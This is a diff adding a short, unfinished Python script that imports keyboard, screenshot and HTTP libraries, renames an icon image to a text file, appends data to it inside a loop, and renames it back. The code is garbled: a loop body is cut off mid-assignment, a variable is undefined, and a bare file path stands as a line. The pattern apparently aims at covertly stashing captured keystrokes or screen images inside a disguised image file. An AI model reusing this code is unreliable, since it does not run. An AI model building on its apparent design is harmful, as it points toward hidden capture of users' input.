@@ -1,0 +1,17 @@
+import os
+import pyautogui
+import requests
+import keyboard
+def image_proccess():
+	icon='icon.png'
+	Xox=os.path.splitext(icon)[0]
+	os.rename(icon, Xox+'.txt')
+	f=open("icon.txt", 'a+')
+	while record==True:
+		image= 
+	icon='icon.txt'
+	ten_reverse=os.path.splitext(icon)[0]
+	os.rename(icon, ten_reverse+'.png')
+	print("Done!")
+	while True:
+		/Users/greysonturner/Desktop/FirstScript.txt
